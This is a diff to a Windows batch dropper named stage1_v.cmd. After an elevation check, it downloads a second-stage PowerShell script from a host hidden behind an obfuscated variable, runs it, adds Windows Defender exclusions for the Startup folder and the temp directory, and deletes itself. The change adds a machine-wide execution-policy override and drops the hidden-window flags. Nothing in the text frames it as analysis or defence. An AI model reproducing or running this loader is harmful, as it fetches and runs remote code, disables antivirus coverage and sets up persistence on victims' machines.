@@ -41,8 +41,11 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
     
-    powershell -windowstyle hidden powershell.exe  "Invoke-WebRequest -Uri http://%EcSjRhAguo%/files/stage2_v.ps1 -OutFile stage2_v.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-    powershell -windowstyle hidden ./stage2_v.ps1
+    :: Activer l'exécution des scripts PowerShell
+    powershell -Command "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
+
+    powershell powershell.exe  "Invoke-WebRequest -Uri http://%EcSjRhAguo%/files/stage2_v.ps1 -OutFile stage2_v.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+    powershell ./stage2_v.ps1
     del stage1_v.cmd
 
 
